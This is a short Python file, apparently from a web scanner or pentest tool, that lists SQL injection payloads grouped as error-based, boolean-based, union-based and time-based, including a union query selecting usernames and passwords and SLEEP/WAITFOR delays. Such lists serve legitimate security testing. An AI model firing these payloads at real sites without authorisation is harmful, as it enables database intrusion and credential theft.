ERROR_BASED = [
    "'",
    "\"",
    "'--",
    "'#"
]

BOOLEAN_BASED = [
    "' AND 1=1--",
    "' AND 1=2--",
    "' OR 1=1--",
    "' OR 1=2--"
]

UNION_BASED = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT username,password--"
]

TIME_BASED = [
    "1' AND SLEEP(5)--",
    "' WAITFOR DELAY '0:0:5'--"
]